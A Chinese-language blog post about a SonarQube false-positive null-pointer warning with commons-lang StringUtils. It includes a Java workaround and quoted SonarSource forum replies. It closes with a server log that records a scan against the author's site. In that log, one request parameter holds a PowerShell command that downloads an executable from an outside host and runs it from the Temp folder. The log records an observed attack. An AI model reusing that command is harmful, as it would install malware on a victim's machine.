+++
title = "Sonar扫描的NPE问题"
description = "Commons-lang StringUtils isNotBlank method still raise NPE"
tags = [
]
date = "2020-03-12"
topics = [
    "US"
]
+++

![](https://aws1.discourse-cdn.com/sonarsource/uploads/sscommunity/original/2X/3/318735b08e742b4bab065a9821caa48762a4c697.png)

直到我修改为这样的代码才通过——

```

public class DetectorImport {
    public String check1(Nonentity nonentity) {
        String s;
        if(nonentity == null) {
            s = null;
        }else {
            s = nonentity.getName();
        }
        if(s !=null) {
            s = s.replaceAll("（", "(");
        }
        return s;
    }
}

```

查到的几个相关问题——
[https://community.sonarsource.com/tags/c/bug/fp/7/java](https://community.sonarsource.com/tags/c/bug/fp/7/java)



[Sonarqube is raising false-positive NPE](https://community.sonarsource.com/t/sonarqube-is-raising-false-positive-npe/4515)

2019-07-19  

>I expect that nonNull implementation is in the another file than the main code. Unfortunately that’s the current limitation we have for this rule. If you move nonNull in the file, FP should disappear.
This problem can’t be fixed easily, so for now I suggest you to mark issue as FP in SonarQube UI.
Anyway thanks for reporting it.


[squid:S2259 : A “NullPointerException” could be thrown; “dc” is nullable here. While “dc” is checked as not null](https://community.sonarsource.com/t/squid-s2259-a-nullpointerexception-could-be-thrown-dc-is-nullable-here-while-dc-is-checked-as-not-null/2616)

[[JAVA] squid:S2259 False Positive with Utility methods](https://groups.google.com/forum/#!topic/sonarqube/aluTP63hfyA)
这里提到是支持apache commen的StringUtils包的。

> We currently support methods from commons-lang StringUtils ([v2](https://commons.apache.org/proper/commons-lang/javadocs/api-2.6/org/apache/commons/lang/StringUtils.html), and [v3](https://www.google.com/url?q=https%3A%2F%2Fcommons.apache.org%2Fproper%2Fcommons-lang%2Fapidocs%2Forg%2Fapache%2Fcommons%2Flang3%2FStringUtils.html&sa=D&sntz=1&usg=AFQjCNHiDHLeUkFJvzevRg_dwUkvTbt8nA)), guava [preconditions](https://google.github.io/guava/releases/snapshot/api/docs/com/google/common/base/Preconditions.html#checkNotNull-T-), and java 8 methods from java.util.Objects (nonNull, isNull, requireNonNull). As we know how these methods behave, we are able to correctly handle such call and discard similar FPs. Of course, I don't want to force you using such libraries to make the analyzer happy. :)

report this on Sonar Community: [Commons-lang StringUtils isNotBlank method still raise NPE](https://community.sonarsource.com/t/commons-lang-stringutils-isnotblank-method-still-raise-npe/21517)



没想到我这小破站也被扫描了——
```
2020-03-09 13:48:49.794  INFO 2173 --- [p-nio-80-exec-3] org.apache.tomcat.util.http.Parameters   : Character decoding failed. Parameter [mail[#markup]] with value [ powershell (new-object System.Net.WebClient).DownloadFile('http://ero.bckl.ir/download.exe','%SystemRoot%/Temp/zjajlhxadgirori21058.exe');start %SystemRoot%/Temp/zjajlhxadgirori21058.exe] has been ignored. Note that the name and value quoted here may be corrupted due to the failed decoding. Use debug level logging to see the original, non-corrupted values.
 Note: further occurrences of Parameter errors will be logged at DEBUG level.
2020-03-10 03:44:19.910  INFO 2173 --- [p-nio-80-exec-7] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
 Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.

java.lang.IllegalArgumentException: Invalid character found in the HTTP protocol
	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:532) ~[tomcat-embed-core-9.0.21.jar!/:9.0.21]
	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:294) ~[tomcat-embed-core-9.0.21.jar!/:9.0.21]
	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66) [tomcat-embed-core-9.0.21.jar!/:9.0.21]
	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:853) [tomcat-embed-core-9.0.21.jar!/:9.0.21]
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1587) [tomcat-embed-core-9.0.21.jar!/:9.0.21]
	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.21.jar!/:9.0.21]
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_232]
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_232]
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.21.jar!/:9.0.21]
	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_232]

```

